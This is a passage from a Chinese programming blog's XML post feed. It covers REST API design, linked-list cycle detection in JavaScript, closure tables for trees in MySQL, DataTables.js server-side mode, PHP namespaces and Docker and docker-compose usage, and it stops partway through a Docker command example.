（统一资源定位符）是用于标识资源的字符串，资源如果可数则使用名词复数表示，否则使用单数表示，以用户users为例， 获取用户列表 1GET /users 获取具体用户 1GET /users/:user_id 如 /users/1 表示获取用户 id 为 1 的用户 新增用户 1POST /users 修改用户 1PUT /users/:user_id 客户端（表单）应提供完整的用户信息 修改用户的部分属性 1PATCH /users/:user_id 客户端提供要修改的用户属性 删除用户 1DELETE /users/:user_id 以上只是最基本的 URI 设计原则，但是在实际工程中，多个资源之间会存在关联关系，如在经典的博客系统中，存在「用户—文章—评论」存在如下关联关系： 一篇文章必定有一个或多个作者 一个评论必定属于具体的一篇文章 用如下方式可表示「查看某个用户发布的文章」： 1GET /users/1/articles # 查看 user_id 为 1 的文章 2.5 URL 参数URL 参数应该只是对资源的过滤，不应该有其他作用，一般可用于分页、排序和筛选 12345?limit=10：指定返回记录的数量?offset=10：指定返回记录的开始位置。?page=2&amp;per_page=100：指定第几页，以及每页的记录数。?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。?animal_type_id=1：指定筛选条件 2.6 HTTP 请求头HTTP 请求头可以携带附加信息，如版本号、响应格式和 Token 等。 2.7 HTTP 状态码HTTP 状态码是由三位整数组成的，分为 5 大系列 1xx : 请求已被接受，等待进一步处理，一般不常用。 在使用 websocket 的时候从 websocket 协议升级到 socket.io 协议时返回 101，表示转换协议。 2xx: 请求成功 3xx: 重定向 4xx: 客户端错误 5xx: 服务端异常 详细的 HTTP 状态码可参考维基百科 或 RFC2616 3. 不符合 CURD 的操作在实际生产中，并非所有的 HTTP 请求都符合资源的 CURD 操作，不符合常规资源 CURD 操作的请求一般有如下三种处理方法： 增加动作，并使用 POST 方法执行动作 如文章发布 POST /articles/:id/publish 增加控制参数 发布文章使用 PATCH 更改文章的 published 属性 PATCH /articles/:id?published=true 把动作转化为资源 GitHub 把「喜欢」这个动作转化为一个资源 star，因为喜欢是不可数的，所以使用单数表示，比如“喜欢”一个 gist，使用 PUT /gists/:id/star，“取消喜欢”使用 DELETE /gists/:id/star。 4. REST 的优点 可更高效利用 HTTP 缓存来提高响应速度 通讯本身的无状态性可以让不同的服务器的处理一系列请求中的不同请求，提高服务器的扩展性 浏览器即可作为客户端，简化软件需求 相对于其他叠加在HTTP协议之上的机制，REST的软件依赖性更小 不需要额外的资源发现机制 在软件技术演进中的长期的兼容性更好]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有环链表]]></title>
    <url>%2Ffundamental%2Falgorithm%2Falgorithm-find-circle-linked-list%2F</url>
    <content type="text"><![CDATA[【定义 1】 链表有环：如果链表的尾节点指向了链接中间的某个节点，则该链表有环。 「问题」： 判断一个链表是否有环，如果有请找出环的开始节点。 如图所示，两指针$walker$和$runner$同时从链表起点开始出发，其中$runner$的速度是$walker$的两倍，若存在环，则两指针必定在环内相遇，因此如下程序即可判断链表是否有环： 12345678910111213141516171819202122232425262728/** * Definition for singly-linked list. * function ListNode(val) &#123; * this.val = val; * this.next = null; * &#125; *//** * @param &#123;ListNode&#125; head * @return &#123;boolean&#125; */var hasCycle = function(head) &#123; var runner = head; var walker = head; while (runner &amp;&amp; runner.next) &#123; walker = walker.next; runner = runner.next; runner = runner.next; if(runner === walker) &#123; return true; &#125; &#125; return false;&#125;; 如图，设链表头到入环口的距离为$L$，环周长为$R$，慢指针$walker$和快指针$runner$ \textcolor{red}{第一次相遇}在节点 $cross$，其中入环口到相遇点$cross$距离为$S$，相遇时$runner$比 $walker$ 多走了 $n (n \in N+)$ 圈，此时$runner$的路程为$L + S + nR$，$walker$ 的路程为$L+R$，由于 $runner$ 的速度是$walker$ 的两倍，则： $$ 2(L + S) = L + S + nR $$ 即： $$ L = nR - S $$ 其中$R-S$ 表示从 $cross$ 到入环节点的距离，因此从$cross$点开始往前走$n$圈后，$nR - S$ 总是代表入环点。 如果两指针$fromCross$和$fromHead$分别以相同的速度从$cross$节点和起点$head$出发，当$fromHead$ 走到入环点处时，$fromCross$和$fromHead$的路程都为 $L$，又因为$L = nR - S$，那么他们必定在入环点相遇，故可用如下程序找出入环点， 1234567891011121314151617181920212223242526272829303132333435/** * Definition for singly-linked list. * function ListNode(val) &#123; * this.val = val; * this.next = null; * &#125; *//** * @param &#123;ListNode&#125; head * @return &#123;ListNode&#125; */var detectCycle = function(head) &#123; var runner = head; var walker = head; while (runner &amp;&amp; runner.next) &#123; walker = walker.next; runner = runner.next; runner = runner.next; if(runner === walker) &#123; var fromHead = head; var fromCross = runner; while (fromHead !== fromCross) &#123; fromHead = fromHead.next; fromCross = fromCross.next; &#125; return fromHead; &#125; &#125; return null;&#125;;]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树在 MySQL 中的存储方式]]></title>
    <url>%2Ffundamental%2Fstorage%2Fmysql-store-tree-using-closure-table%2F</url>
    <content type="text"><![CDATA[参考《大话数据结构》，如下定义树： 树（Tree）是n（n&gt;=0）个结点的有限集。n=0时称为空树。在任意一颗非空树中：有且仅有一个特定的称为根（root）的结点；当n&gt;1时，其余结点可分为m(m&gt;0)个互补交互的有限集T1、T2…Tm，其中每一个集合本身又是一棵树，并称为根的子树（SubTree）。 在工作中，树被广泛使用，最常见的就是数据库中的 B+ 树，除此之外，网站中的菜单也常常是用树来表达其中的层次关系的（hierarchical），本文重点讲解基于菜单树这种应用常见下树在数据库中的存储方式。 参考《SQL 反模式》，树在数据库中常见的存储方式有： 领接表 路径枚举 嵌套集 闭包表 最简单最常见的是领接表，最高效的是闭包表，所以本文将重点讨论领接表和闭包表。 领接表这种存储方式很简单，就是给每一条记录添加一个指向父亲节点的指针，即 parent_id。123456CREATE TABLE `menus` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id', `menu_name` varchar(64) NOT NULL DEFAULT '' COMMENT '语义化的菜单名称', `parent_id` int(10) NOT NULL DEFAULT '1' COMMENT '菜单父节点id', PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='菜单表' 闭包表123456CREATE TABLE `menu_tree` ( `ancestor` bigint(20) unsigned NOT NULL COMMENT '祖先节点', `descendant` bigint(20) unsigned NOT NULL COMMENT '子代节点', `distance` int(11) unsigned NOT NULL COMMENT '子孙到祖先中间相差的层级数目', PRIMARY KEY `uniq_ancestor_descendant` (`ancestor`,`descendant`,`distance`)) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8 COMMENT='菜单闭包表' // 未完，待续……]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>Tree</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DataTable.js 使用笔记]]></title>
    <url>%2Fexperience%2Fpractice%2Ffrontend-datatable-js-example%2F</url>
    <content type="text"><![CDATA[Datatables是一款jquery表格插件。它是一个高度灵活的工具，可以将任何HTML表格添加高级的交互功能。 Datatables 灵活易用，具有如下特性： 自动分页 即时搜索 多种排序规则，可自定义任意列排序，也可以多列排序 可对分页样式、搜索框等自定义 CSS 国际化，支持多种语言 …… 一、如何使用实例化Datatable 的初始化很简单，引入jquery.dataTables.css、 jquery.dataTables.js 和 jquery.js 后使用 $(&lt;selector&gt;).DataTable() 实例化一个表格，完整案例如下， 12345678910111213141516&lt;!--引入css--&gt;&lt;link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.15/css/jquery.dataTables.min.css"&gt;&lt;!--引入JavaScript--&gt;&lt;script type="text/javascript" language="javascript" src="//code.jquery.com/jquery-1.12.4.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" language="javascript" src="https://cdn.datatables.net/1.10.15/js/jquery.dataTables.min.js"&gt;&lt;/script&gt;&lt;!--定义DOM--&gt;&lt;table id="example" class="display" style="width:100%"&gt;&lt;!--初始化代码--&gt;&lt;script&gt; $(document).ready(function() &#123; let exampleTable = $('#example').DataTable(); &#125;);&lt;/script&gt; 值得注意的在 1.10.x 之前是使用 let exampleTable = $(&#39;#example&#39;).dataTable(); 初始化，dataTable 是一个jQuery 对象，1.10.x 后虽然也对该对象做了兼容但不建议使用，具体的差别可以参见 here。 四种数据源DataTable 的数据源一般可以从如下四种渠道中获得， 如果表格中已经有数据则 DataTable 的数据源从 DOM 中获取，这是最简单的获取数据的方式； 可以从 JavaScript 数组或对象中获得，如下案例， 123456789101112131415161718192021var dataSet = [ ['Trident','Internet Explorer 4.0','Win 95+','4','X'], ['Trident','Internet Explorer 5.0','Win 95+','5','C'], ['Gecko','Firefox 1.0','Win 98+ / OSX.2+','1.7','A'], ['Gecko','Firefox 1.5','Win 98+ / OSX.2+','1.8','A'],];$(document).ready(function() &#123; $('#demo').html( '&lt;table cellpadding="0" cellspacing="0" border="0" class="display" id="example"&gt;&lt;/table&gt;' ); $('#example').dataTable( &#123; "data": dataSet, "columns": [ &#123; "title": "Engine" &#125;, &#123; "title": "Browser" &#125;, &#123; "title": "Platform" &#125;, &#123; "title": "Version", "class": "center" &#125;, &#123; "title": "Grade", "class": "center" &#125; ] &#125; );&#125; ); 从 JavaScript 数组中获取是通过配置选项中的 data 参数指定，同时需要用 columns 指定表头。 通过 AJAX 获得， 12345$(document).ready(function() &#123; $('#example').DataTable( &#123; "ajax": 'path/to/dataList.txt' &#125; );&#125; ); 其中 dataList.txt 是一个如下格式 JSON 对象， 12345678910111213141516171819202122232425262728&#123; "data": [ [ "Tiger Nixon", "System Architect", "Edinburgh", "5421", "2011/04/25", "$320,800" ], [ "Garrett Winters", "Accountant", "Tokyo", "8422", "2011/07/25", "$170,750" ], [ "Ashton Cox", "Junior Technical Author", "San Francisco", "1562", "2009/01/12", "$86,000" ] ]&#125; 除了以上几种方法外，如果数据量比较大，这个时候就需要使用服务器模式（Server-Side）动态获取数据。 在服务器模式下，所有的分页、搜索、排序等操作，Datatables 都会交给服务器去处理。所以每次绘制Datatables， 都会请求一次服务器获取需要的数据，详细案例请见下文。 二、Server-Side 案例使用 Server-Side 模式加载数据时，要先使用 serverSide 配置项打开 Server-Side 模式，同时开启 processing 在动态加载数据时会提示用户“数据正在加载，请稍等……”，使用 ajax 选项配置后端处理脚本的路径， 1234567$(document).ready(function() &#123; $('#example').dataTable( &#123; "processing": true, "serverSide": true, "ajax": "path/to/handleAjax.php" &#125; );&#125; ); 分页、搜索、排序等操作都会再次请求服务器获得新的数据源，发送 AJAX 请求时除了手动添加的参数外，DataTable 还会自动添加如下参数， 1234567891011121314151617181920// 用于标记请求draw: 2// 表头信息columns[0][data]: idcolumns[0][name]:columns[0][searchable]: truecolumns[0][orderable]: truecolumns[0][search][value]:columns[0][search][regex]: false...columns[n][search][regex]: false// 排序规则，如下表示第一个排序规则是：按照第三列（从 0 开始）降序排列order[0][column]: 2order[0][dir]: desc// 分页参数start: 10length: 10// 筛选参数search[value]:search[regex]: false AJAX 响应的数据包中，至少应该包括以下字段， 1234draw: 2 // 标记请求，从请求参数中获取即可data: [&#123;id: "13155030", date: "2018-07-27", parent_id: "76958474430",…&#125;,…] // 表格数据recordsFiltered: 3236 // 符合筛选条件的总条数recordsTotal: 3236 // 总条目数 如果服务端处理错误，可以使用 error 返回错误信息，错误信息将在实例化表格时弹窗显示。 参考链接 Server-Side 配置选项]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 命名空间]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fphp%2Fphp-namespace%2F</url>
    <content type="text"><![CDATA[命名空间抽样模型编程的本质是抽象，命名空间是一种编程抽象模型，它表示了一个标识符的可见范围。生活中我们会经常遇到两个人完全重名的情况，但是他们是不会被混淆的，因为他们来自不同的家庭，如果两人都来自同一个家庭，那么哥哥叫“小明”，弟弟绝对就不会再起名为“小明”了，我们可以认为每一个家庭都是一个命名空间。这种抽象模型在计算机中也被广泛应用，如计算机操作系统中同一个目录下是不允许有两个相同文件名的文件的，但不同的目录下确可以有文件名相同的文件。如12$ whereis pythonpython: /usr/bin/python2.6 /usr/bin/python /usr/local/bin/python2.6 python2.6 分别在不同的目录下，假设要使用 /usr/bin/ 下的 python2.6 应按如下方式调用，1$ /usr/bin/python2.6 -h 要使用 /usr/local/bin 下的 python2.6 则应如下调用，1$ /usr/local/bin/python2.6 除了使用绝对路径（绝对命名空间）方式调用之外，也可以通过文件的相对路径调用，假设当前路径位于 /usr/ 下则，1$ ./bin/python2.6 -v 即可调用到 /usr/bin/python2.6。 命名空间是一种编程抽象模型，除了在操作系统中的应用，编程语言中也有广泛应用命名空间。在 PHP 中，命名空间主要用来解决两类问题： 命名冲突——用户编写的代码与PHP内部的或第三方的类、函数、常量、接口名字冲突 提高可读性——为很长的标识符名称创建一个别名的名称，提高源代码的可读性 PHP命名空间提供了一种将相关的类、函数、常量和接口组合到一起的途径，不同命名空间的类、函数、常量、接口相互隔离不会冲突，注意：PHP命名空间只能隔离类、函数、常量和接口，不包括全局变量。 命名空间使用命名空间申明命名空间使用 namespace 申明，命名空间必须在除了 declare关键字以外的其他代码之前申明，也就是说只要没有 declare 关键字，命名空间的申明都必须放在文件的开头。假设有一个基类 app/controllers/Controller.php 1234567&lt;?phpnamespace App\Controllers;class Controller &#123;&#125;?&gt; 需要特别注意的是：定义命名空间时省略了根空间符号 “\”，namespace App\Controllers; 定义的命名空间实际上是 \App\Controller，因此再引用命名空间时一定要记得加上根空间符号”\”，这种特殊方式实际上是可以类比的，如果你熟悉 shell 编程，你就会知道这和 shell 中的变量是一样的，shell 变量再申明或赋值的时候省略了 “$”，如 123name = 'Syncher'; # 申明...echo $name; # 使用 命名空间引用在 app/controllers/user/LoginController.php 中要继承 app/controllers 中的 Controller 类， 首先需要引入文件 然后引用命名空间 12345678&lt;?phpnamespace App\Controllers\User;include '../Controller.php';class LoginController extends \App\Controllers\Controller &#123; // some codes here ...&#125; 引用命名空间的方式有如下三种， 非限定名称 非限定名称，或不包含前缀的类名称，会被解析为当前命名空间下。相当于文件系统中的当前路径，如下所示的 Controller 类将被解析为 \App\Controllers\User\Controller， 123456namespace App\Controllers\User;include '../Controller.php';class LoginController extends Controller &#123; // some codes here ...&#125; 而当前命名空间下没有该类，因此会报如下错误， 限定名称 限定名称,或包含前缀的名称和非限定名称类似，相当于文件系统中的相对路径，如下代码中的 Controller 类将被解析为 \App\Controllers\User\App\Controllers\Controller， 123456namespace App\Controllers\User;include '../Controller.php';class LoginController extends App\Controllers\Controller &#123; // some codes here ...&#125; 而当前命名空间下没有该类，因此会报如下错误， 完全限定名称 完全限定名称，或包含了全局前缀操作符的名称，相当于文件系统中的相对路径。如下为正确的对 Controller 类的继承， 123class LoginController extends \App\Controllers\Controller &#123; // some codes here ...&#125; 除了在标识符前面添加限定词之外，还可以使用 use 导入使用类，如use \App\Controllers\Controller as Controller; as 是指定导入类的别名，如果导入类的别名和原名相同则可省略别名的描述。 1234567namespace App\Controllers\User;use \App\Controllers\Controller; // 相当于：use \App\Controllers\Controller as Controller;include '../Controller.php';class LoginController extends Controller &#123; // some codes here ...&#125; 根据 PSR 要求，命名空间应与文件路径一致，比如 Laravel 默认生成的 app/Http/Controllers/Auth/LoginController.php，其命名空间为 App\Http\Controllers\Auth， 1234567891011&lt;?phpnamespace App\Http\Controllers\Auth;use App\Http\Controllers\Controller;use Illuminate\Foundation\Auth\AuthenticatesUsers;class LoginController extends Controller&#123; // code here ...&#125; 命名空间与文件路径一致是 PSR 的规范，但这并不意味这命名空间和文件名有关联，实际上二者并无关系，这样规范是为了更加方便自动加载。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 学习笔记（2）]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-learning-docker-II%2F</url>
    <content type="text"><![CDATA[上一篇文章介绍了 Docker 的基本使用，本文将介绍 Dockerfile 定制容器镜像和使用 Docker-compose 工具编排、管理 Docker。 一、Dockerfile 定制镜像容器分层Docker 镜像位于 bootfs 之上，镜像分层，每一层镜像的下面一层成为其父镜像，镜像启动之后称为容器， 容器在镜像之上堆叠新的一层，所有的镜像层都是 readonly，所以容器层的改变不会影响其父镜像。 如图，一个 Apache 镜像有 Debian 基础镜像堆叠 emacs 等工具镜像后打包而成，镜像启动后成为容器。 定制容器使用 docker commit 可以保存容器的改变，但不建议以此方式定制容器， 123$ docker image ls$ docker image rm xxxError response from daemon: conflict: unable to delete 920e5c5c8bed (cannot be forced) - image has dependent child images 这种方式定制的容器是基于上一个父容器存储层的改变，因此存在相互依赖关系，使得镜像管理更加繁琐。 可以使用 Dockerfile 定制容器，如下定制自己的 nginx 容器， 123$ mkdir mynginx$ cd mynginx$ touch Dockerfile 编辑 Dockerfile文件，添加以下内容 12FROM nginxRUN echo '&lt;h1&gt;Hello, Docker!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html 构建容器 1$ docker build -t ngxin:mynginx . 更多 Dockerfile 相关命令如下， FROM RUN COPY 本地文件拷贝到新一层的镜像内，新镜像存储路径可以用相对路径也可以用绝对路径，相对路径用 WORKDIR 命令指定 ADD CMD ENTRYPOINT ENV 设置环境变量 VOLUME 定义匿名卷 EXPOSE 暴露端口 WORKDIR USER 二、使用 Docker-composeDocker-compose 是官方开源的项目，用于编排、部署 Docker 项目(Define and run multi-container applications with Docker)。 4.1 定义 docker-compose.yml1234567891011version: '2'services: web: build: . ports: - "5000:5000" volumes: - .:/code redis: image: redis 4.2 docker-compose 命令 build 格式为 docker-compose build [options] [SERVICE...]。 构建（重新构建）项目中的服务容器。 服务容器一旦构建后，将会带上一个标记名，例如对于 web 项目中的一个 db 容器，可能是 web_db。 可以随时在项目目录下运行 docker-compose build 来重新构建服务。 选项包括： --force-rm 删除构建过程中的临时容器。 --no-cache 构建镜像过程中不使用 cache（这将加长构建过程）。 --pull 始终尝试通过 pull 来获取更新版本的镜像。 ​ config 验证 Compose 文件格式是否正确，若正确则显示配置，若格式错误显示错误原因。 down 此命令将会停止 up 命令所启动的容器，并移除网络 ​ exec 进入指定的容器。 help 获得一个命令的帮助。 images 列出 Compose 文件中包含的镜像。 kill 格式为 docker-compose kill [options] [SERVICE...]。 通过发送 SIGKILL 信号来强制停止服务容器。 支持通过 -s 参数来指定发送的信号，例如通过如下指令发送 SIGINT 信号。 1$ docker-compose kill -s SIGINT logs 格式为 docker-compose logs [options] [SERVICE...]。 查看服务容器的输出。默认情况下，docker-compose 将对不同的服务输出使用不同的颜色来区分。可以通过 --no-color 来关闭颜色。 该命令在调试问题的时候十分有用。 pause 格式为 docker-compose pause [SERVICE...]。 暂停一个服务容器。 port 格式为 docker-compose port [options] SERVICE PRIVATE_PORT。 打印某个容器端口所映射的公共端口。 选项： --protocol=proto 指定端口协议，tcp（默认值）或者 udp。 --index=index 如果同一服务存在多个容器，指定命令对象容器的序号（默认为 1）。 ps 格式为 docker-compose ps [options] [SERVICE...]。 列出项目中目前的所有容器。 选项： -q 只打印容器的 ID 信息。 pull 格式为 docker-compose pull [options] [SERVICE...]。 拉取服务依赖的镜像。 选项： --ignore-pull-failures 忽略拉取镜像过程中的错误。 push 推送服务依赖的镜像到 Docker 镜像仓库。 restart 格式为 docker-compose restart [options] [SERVICE...]。 重启项目中的服务。 选项： -t, --timeout TIMEOUT 指定重启前停止容器的超时（默认为 10 秒）。 rm 格式为 docker-compose rm [options] [SERVICE...]。 删除所有（停止状态的）服务容器。推荐先执行 docker-compose stop 命令来停止容器。 选项： -f, --force 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。 -v 删除容器所挂载的数据卷。 run 格式为 docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]。 在指定服务上执行一个命令。 例如： 1$ docker-compose run ubuntu ping docker.com 将会启动一个 ubuntu 服务容器，并执行 ping docker.com 命令。 默认情况下，如果存在关联，则所有关联的服务将会自动被启动，除非这些服务已经在运行中。 该命令类似启动容器后运行指定的命令，相关卷、链接等等都将会按照配置自动创建。 两个不同点： 给定命令将会覆盖原有的自动运行命令； 不会自动创建端口，以避免冲突。 如果不希望自动启动关联的容器，可以使用 --no-deps 选项，例如 1$ docker-compose run --no-deps web python manage.py shell 将不会启动 web 容器所关联的其它容器。 选项： -d 后台运行容器。 --name NAME 为容器指定一个名字。 --entrypoint CMD 覆盖默认的容器启动指令。 -e KEY=VAL 设置环境变量值，可多次使用选项来设置多个环境变量。 -u, --user=&quot;&quot; 指定运行容器的用户名或者 uid。 --no-deps 不自动启动关联的服务容器。 --rm 运行命令后自动删除容器，d 模式下将忽略。 -p, --publish=[] 映射容器端口到本地主机。 --service-ports 配置服务端口并映射到本地主机。 -T 不分配伪 tty，意味着依赖 tty 的指令将无法运行。 scale 格式为 docker-compose scale [options] [SERVICE=NUM...]。 设置指定服务运行的容器个数。 通过 service=num 的参数来设置数量。例如： 1$ docker-compose scale web=3 db=2 将启动 3 个容器运行 web 服务，2 个容器运行 db 服务。 一般的，当指定数目多于该服务当前实际运行容器，将新创建并启动容器；反之，将停止容器。 选项： -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。​ start 格式为 docker-compose start [SERVICE...]。 启动已经存在的服务容器。 stop 格式为 docker-compose stop [options] [SERVICE...]。 停止已经处于运行状态的容器，但不删除它。通过 docker-compose start 可以再次启动这些容器。 选项： -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。 top 查看各个服务容器内运行的进程。 unpause 格式为 docker-compose unpause [SERVICE...]。 恢复处于暂停状态中的服务。 up 格式为 docker-compose up [options] [SERVICE...]。 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。 链接的服务都将会被自动启动，除非已经处于运行状态。 可以说，大部分时候都可以直接通过该命令来启动一个项目。 默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。 当通过 Ctrl-C 停止命令时，所有容器将会停止。 如果使用 docker-compose up -d，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。 默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容。如果用户不希望容器被停止并重新创建，可以使用 docker-compose up --no-recreate。这样将只会启动处于停止状态的容器，而忽略已经运行的服务。如果用户只想重新部署某个服务，可以使用 docker-compose up --no-deps -d &lt;SERVICE_NAME&gt; 来重新创建服务并后台停止旧服务，启动新服务，并不会影响到其所依赖的服务。 选项： -d 在后台运行服务容器。 --no-color 不使用颜色来区分不同的服务的控制台输出。 --no-deps 不启动服务所链接的容器。 --force-recreate 强制重新创建容器，不能与 --no-recreate 同时使用。 --no-recreate 如果容器已经存在了，则不重新创建，不能与 --force-recreate 同时使用。 --no-build 不自动构建缺失的服务镜像。 -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。​ version 格式为 docker-compose version。 打印版本信息。 更多关于 docker-compose 的使用请参考官方文档。]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 学习笔记（1）]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-learning-docker-I%2F</url>
    <content type="text"><![CDATA[Docker 是一种新的虚拟化技术，随着技术的不断革新 Docker 越来越受开发者的青睐，Docker 给开发带来了诸多方便，如提供如本地开发环境、单元测试环境、构建环境；Docker 还常用语弹性云服务和组件微服务。本文主要介绍 Docker 的基本使用，更多进阶内容我们将在下一节介绍。 一、认识 DockerLinux 容器（LXC）和 DockerLXC 是Linux 发展的一种新的虚拟化技术，他的虚拟不是基于硬件层面的，而是对进程的隔离，再正常的进程外面套了一个保护层，封装称一个容器。 Docker 是基于 LXC 的封装，进一步封装了文件系统和网络互联和进程隔离等。Docker 使用 Google 公司推出的 Go 语言 进行开发实现，基于 Linux 内核的 cgroup，namespace，以及AUFS 类的 Union FS 等技术，对进程进行封装隔离，属于 操作系统层面的虚拟化技术。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。最初实现是基于 LXC，从 0.7 版本以后开始去除 LXC，转而使用自行开发的 libcontainer，从 1.11 开始，则进一步演进为使用 runC 和 containerd。 传统虚拟化技术是基于硬件的虚拟化，与传统虚拟化技术不同， Docker 是基于操作系统层面的虚拟化技术， 相比与传统的虚拟化技术，Docker 具有启动快、占用内存小、轻量、可动态扩容等特点， Docker 主要用途 提供一次性环境，如本地开发环境、单元测试环境、构建环境等 弹性云服务，动态扩容 组件微服务架构 Docker 基本概念 —— 镜像、容器和仓库 镜像 image Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。 容器 Container 容器是镜像的实例，是Docker服务直接操作的对象，容器可以被创建、启动、停止、删除和暂停等。 容器的实质是进程，运行在属于自己的独立的命名空间。 容器以镜像为基础层，并在此基础上创建了一个存储层，容器运行时，大部分读写操作都发生在存储层，存储层的生命周期和容器一致，容器销毁时存储层也随之消毁。 按照 Docker 的最佳实践，容器存储层不应写入任何有效数据，所有文件的写入操作都应该使用数据卷(Volume)、或者绑定宿主目录，这样数据的读写会直接跳过容器的存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更加高。因此，数据卷是容器数据持久化的一种设计方案。 仓库 Registry 和 Git 仓库类似，仓库是用与存储镜像的，Docker 中仓库名一般有两段路径构成，如 daocloud.io/nginx 前者是仓库地址，后者是仓库名称，一个仓库中包含多个标签 Tag,每个 Tag 对应一个镜像。 二、Docker 基本使用Windows 7 下安装 Docker目前 Docker 分为两个发行版，社区版（CE）和企业版（EE），企业版提供一些收费服务，对于我们普通开发者来说，社区版就足以使用，所以我们选择安装社区版就行了。早期的 Docker 是基于 LXC 的，对于 Windows 7，官方提供了 Docker Toolbox 集成工具用于支持 Docker。 Docker Toolbox 实际上集成了 VirtualBox、boot2docker 和一些 docker 常用工具，如 git、docker-compose、docker-machine 等。从官方下载 Docker ToolBox ，安装即可（如需更加详细的安装教程可自行 Google 或百度之），需要注意的是安装路径不应有中文字符。 一般而言，安装完成之后，点击桌面上的 Docker QuickStart Terminal 快捷方式或进入安装目录双击 start.sh启动 Docker 服务。启动 Docker 服务后，使用如下命令查看 Docker 相关信息， 123$ docker version$ docker info 如图，Docker 分为客户端和服务端，与 Linux 不同的是 Docker 并不是直接运行在 Windows 系统之上的，而是运行在一个轻量级的 Linux 虚拟机上，这个虚拟机就是之前提到的 boot2docker。图中显示的 IP 地址192.169.99.100就是这个虚拟机的 IP，使用 xshell 或类似工具可以 ssh 连接到这台虚拟机上，默认用户名和密码分别是 docker和tcuser。 小试牛刀， 1$ docker run hello-world docker run hello-world 表示启动基于 hello-world 镜像容器，如果本地不存在 hello-world镜像那么将从远程镜像仓库 docker hub 中下载，为了提高下载速度，我们可以手动修改镜像地址为国内镜像。 修改 profile 文件 1$ sudo vi /var/lib/boot2docker/profile 将--registry-mirror=https://registry.docker-cn.com 添加到 EXTRA_ARGS中 重启 docker 服务 1$ sudo /etc/init.d/docker restart 验证 1$ docker info ​ 镜像管理 从远程仓库拉取镜像 docker pull [选项] [地址]/仓库名:[标签] 其中标签是镜像的标识，有点类似与版本号 1$ docker pull ubuntu:16.04 查看镜像 12$ docker images$ docker image ls 【注意】从查看结果中有些镜像没有仓库名也没有标签，这写镜像被成为虚悬镜像（dangling image），这些镜像没有名称一般是因为新镜像构建时与旧镜像同名导致旧镜像名称被占用。 为了加速镜像构建，Docker 会利用中间层镜像，docker image ls只会列出顶层镜像，使用如下命令可以查看到中间层镜像， 1$ docker image ls -a 删除本地镜像 1$ docker image rm [tag|id] 前面提到过的虚悬镜像一般来讲，已经失去了存在的价值，可以用如下命令批量删除虚悬镜像， 1$ docker image prune ​ 容器管理 启动一个容器 docker run [container] 123$ docker run hello-world$ docker run -d nginx$ docker run -it --rm ubuntu:16.04 bash -it：这是两个参数很重要，-t 是启动容器是分配一个伪终端，i 是让容器的标准输入保持打开。我们这里打算进入 bash 执行一些命令并查看返回结果，因此我们需要交互式终端。 –rm：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 docker rm。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 –rm 可以避免浪费空间。 ubuntu:16.04：这是指用 ubuntu:16.04 镜像为基础来启动容器。 bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 bash。 -d 是让容器作为宿主机的后台进程运行。 查看容器 docker container ls 或 docker ps 停止容器 docker [container] stop container_id || docker [container] kill container_id 1234$ docker container stop 308bb024a63b$ docker stop 308bb024a63b$ docker container kill 308bb024a63b$ docker kill 308bb024a63b 进入容器 docker exec [OPTIONS] CONTAINER COMMAND [ARG…][flags] 1$ docker exec -it 124f52960169 bash 删除容器 docker [container] rm container_id 彻底从 docker ps -a 列表中删除，docker start 不能启动。 docker container prune 清楚所有停止的容器 保存容器的改变 docker commit [选项] &lt;容器ID或容器名&gt; [&lt;仓库名&gt;[:&lt;标签&gt;]] 1$ docker run --name mynginx -d -p 80:80 nginx:alpine 进入容器 1234567891011$ docker 